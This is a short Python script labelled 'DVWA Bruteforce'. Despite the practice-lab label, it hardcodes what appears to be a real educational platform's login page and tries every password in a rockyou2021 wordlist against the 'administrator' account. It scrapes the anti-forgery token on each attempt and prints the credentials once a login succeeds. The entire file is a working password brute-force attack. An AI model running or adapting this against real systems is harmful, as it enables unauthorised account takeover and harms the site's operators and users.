#!/usr/bin/env python3

import requests
import re
from cmd import Cmd
import sys
import time

class Terminal(Cmd):
	intro = "DVWA Bruteforce"
	prompt = "url >> "
	def default(self, args):
		bruteforcer(args)

def bruteforcer(url):

	urli = "https://box-educloud.pcgacademia.pl/Account/Login"
	#print (url)
	session = requests.session()
	login = session.get(urli)
	user_token = re.search("\"__RequestVerificationToken\" type=\"hidden\" value=\"(.*?)\"", login.text).group(1)
	print (f"user-token: {user_token}\n")
	with open("rockyou2021.txt", 'r', encoding='utf=8') as file:
		#print ("Hi")
		content = file.readlines()
		passwords = [x.strip() for x in content]

		for password in passwords:
			login = session.get(urli)
			user_token = re.search("\"__RequestVerificationToken\" type=\"hidden\" value=\"(.*?)\"", login.text).group(1)
			print (f"user-token: {user_token}\n")
			post_data = {
				"Username" : "administrator",
				"Password" : password,
				"__RequestVerificationToken" : user_token,
				"ReturnUrl" : "",
				"button" : "login",
				"RememberLogin" : "false"
				}
			validation = session.post(urli, data=post_data)
			if "Zaloguj si" in validation.text:
				print (f"Bledne dane")
				pass
			else:
				#print (validation.text)
				print (f"UWAGA!!! Dane logowania \n {post_data['Username']}:{password}")
				sys.exit()

			#print (validation.text)
			#time.sleep(10)

if __name__ == ("__main__"):
	terminal = Terminal()
	terminal.cmdloop()
